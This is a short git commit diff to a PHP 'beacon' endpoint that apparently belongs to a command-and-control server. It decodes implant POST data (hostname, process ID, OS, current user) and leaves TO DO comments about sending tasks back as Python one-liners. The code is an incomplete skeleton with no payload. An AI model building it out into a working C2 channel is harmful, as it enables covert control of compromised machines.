38e1ecf4185240b6d15861e4f74b945bedb6ab70
Hunter Hardman <t3ntman@gmail.com>
2017-03-19 07:08:02 -0600

    Added in JSON POST data decode and "to do" actions

--- Website/beacon.php
+++ Website/beacon.php
@@ -1,3 +1,17 @@
 <?php
-    echo "This is a beacon response";
+    include "connector.php";
+
+    # JSON decodes implant POST data
+    $post_data = json_decode(file_get_contents("php://input"), true);
+
+    $hostname = $post_data["hostname"];
+    $process_id = $post_data["process_id"];
+    $os = $post_data["os"];
+    $current_user = $post_data["current_user"];
+
+    # TO DO: Check if old or new beaconing host
+
+    # TO DO: If new host, check for tasking
+
+    # TO DO: If tasking, echo appropriate Python one-liner code to do the task
 ?>
